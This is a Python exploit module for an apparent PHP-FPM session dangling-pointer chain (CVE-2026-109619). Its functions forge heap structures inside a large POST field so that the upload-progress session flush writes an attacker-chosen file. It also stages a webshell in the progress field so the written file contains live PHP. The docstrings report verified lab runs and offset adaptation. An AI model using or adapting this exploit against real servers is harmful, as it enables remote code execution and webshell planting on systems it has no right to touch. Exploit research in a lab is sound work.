#!/usr/bin/env python3
# INDEX: single-carrier ps_files->basedir file-write forge (K-seated) | fpm | needs chunk-base K + dangling BG decoder
"""Single-carrier ps_files->basedir file-write for the fpm session-dangle chain
(CVE-2026-109619). This is the write-DELIVERY that lands a file at an attacker path
with the worker surviving — K-seated (the 2MB request-chunk base K must be supplied,
e.g. from a leak; the lab uses an observer /proc read as the stand-in).

Layout (php:8.4.26-fpm, cochunk arm, verified): d=chunk+0x6d000, E=d->last=chunk+0x70000,
ps_files=chunk+0x56208 (last_key@+0, basedir@+8). A single ~100-page page-aligned $_POST
field first-fits at chunk+0x63000 (carrier_base) and spans d, E and a forged DT:
  - d  @carrier+0xa000: d->last=E(abs, needs K), d->first_dtor=d->last_dtor=DT(abs, needs K),
    max_depth large; rest zero (clobbers d — hence K is required here).
  - E  @carrier+0xd000: E->used_slots = AIM = (ps_files - E - 0x10)/8 (chunk-relative, K-free).
  - DT @carrier+0x24000 (chunk+0x87000, FAR above E in clean carrier space): used_slots=0,
    fake basedir backing {len, path+NUL} at DT->data[k+2].

Why it lands (the fix over the earlier crashing variant): the carrier is ZEROED (not
'A'-filled, so var_destroy/var_tmp_var see clean UNDEF slots), DT is placed far above E
(its var_tmp_var slots and backing are in safe carrier memory, not the dense live heap
below E), and the WRITE fires at flush-0 — the FILE_START upload_progress update's
php_session_flush, after decode-0's first two var_pushes set ps_files->{last_key,basedir}
and before the subsequent re-decode walk accumulates. last_key's forged value must be
release-safe (session value int low-word >=2, else zend_string_release_ex efrees a bogus
carrier address -> fatal).

Session record: two int entries whose decoded zvals become the pushed last_key/basedir
pointers; entry0 int >=2 (release-safe). The progress field value carries the webshell
(it becomes a session key, so `<?php ...?>` in it is live PHP when the written file runs).

VERIFIED php:8.4.26-fpm behind nginx, fresh-container-per-trial: /tmp/PWNED written
(session serialization carrying the payload), worker PID stable (survives). NUL-truncated
path. K supplied by the lab observer (leak stand-in) — NOT yet sink-free (d is clobbered,
so d->last is re-forged with K; the K-free d-preserving variant is unsolved for this arm's
E@d+0x3000 adjacency).

d-offset NON-DETERMINISM (important): d's chunk-offset is NOT a fixed 0x6d000 — it is
host-condition-sensitive (0x6a000 / 0x6d000 / 0x6e000 observed across environments; a
fixed-offset forge only lands when d happens to match). build_carrier() is therefore
ADAPTIVE: it takes the observed d_choff and places the d/E forge relative to it, using the
invariant E=d+0x3000 and a fixed carrier_base (0x63000 in-lab). Verified landing + worker
survival across 5 induced d_choff values (0x6d000, 0x6e000, 0x71000, 0x72000, 0x75000, via
arm prepend/cookie), fresh-container. Residual fixed assumptions: carrier_base (held at
0x63000 across all those induced-d trials) and ps_files_choff; carrier_base stability under
the host-LOAD conditions that jitter d is not yet independently confirmed (if it also
jitters, carrier_base would need measuring too, or the carrier a self-locating marker).
"""
from __future__ import annotations

import struct

CARRIER_PAGES = 100
CARRIER_BASE = 0x63000      # measured first-fit of the 100-page page-aligned field
D_CHOFF = 0x6d000
E_CHOFF = 0x70000
DT_CHOFF = 0x87000          # far above E, in clean carrier space


E_D_GAP = 0x3000            # E = d->last sits at d+0x3000 (INVARIANT across all trials)


def build_carrier(chunk_base, d_choff, ps_files_choff, path, *, k=0,
                  carrier_base=CARRIER_BASE, dt_choff=DT_CHOFF, pages=CARRIER_PAGES):
    """Forge the single carrier, ADAPTIVE to the observed d chunk-offset.

    d_choff is NOT reliably 0x6d000: it is host-condition-sensitive (0x6a000/0x6d000/
    0x6e000 observed across environments; see module header). So the d/E forge is placed
    at carrier offsets derived from the *measured* d_choff (the K-seated model reads d via
    the observer for K, so d_choff is in hand), using the invariant E=d+0x3000. Only
    `carrier_base` (the 100-page field's first-fit, stable at 0x63000 in-lab) and
    ps_files_choff are assumed fixed per build.

    `chunk_base` (K) is the 2MB request-chunk base (seated/leaked). `path` is NUL-truncated
    at write. `k` shifts for the push-walk index (k=0 = write at flush-0)."""
    K = chunk_base
    e_choff = d_choff + E_D_GAP
    V = bytearray(pages * 4096)                      # ZEROED
    E_abs, DT_abs = K + e_choff, K + dt_choff
    do = d_choff - carrier_base                      # d-forge offset tracks the measured d
    struct.pack_into("<Q", V, do + 0x00, E_abs)      # d->last = E (needs K)
    struct.pack_into("<Q", V, do + 0x08, DT_abs)     # d->first_dtor = DT
    struct.pack_into("<Q", V, do + 0x10, DT_abs)     # d->last_dtor  = DT
    struct.pack_into("<q", V, do + 0x30, 0x7fffffff)  # d->max_depth
    aim = (ps_files_choff - e_choff - 0x10) // 8 - k
    struct.pack_into("<q", V, (e_choff - carrier_base), aim)   # E->used_slots = AIM
    dto = dt_choff - carrier_base
    struct.pack_into("<q", V, dto, 0)                # DT->used_slots = 0
    bslot = k + 2
    fz = dto + 0x10 + 16 * bslot                     # DT->data[k+2] = fake basedir backing
    pb = (path + "\x00").encode()
    struct.pack_into("<Q", V, fz, len(pb))
    V[fz + 8:fz + 8 + len(pb)] = pb
    return bytes(V)


def stage_parts(carrier, webshell, *, file_field=b"f", filename=b"a.bin", fsize=64,
                progress_key=b"PHP_SESSION_UPLOAD_PROGRESS"):
    """Parts for the stage POST: the carrier, the progress field (value = webshell,
    which becomes a session key so its `<?php...?>` is live code in the written file),
    and a trailing $_FILES part whose FILE_START update fires the forged flush."""
    return [(b"C", carrier, None), (progress_key, webshell, None),
            (file_field, b"Z" * fsize, filename)]


def session_record():
    """The two-entry session the stage decodes: entry0 int low-word >=2 (so the forged
    last_key is release-safe), entry1 int. Written to the session file before the stage."""
    return b"aa|i:9;bb|i:2;"
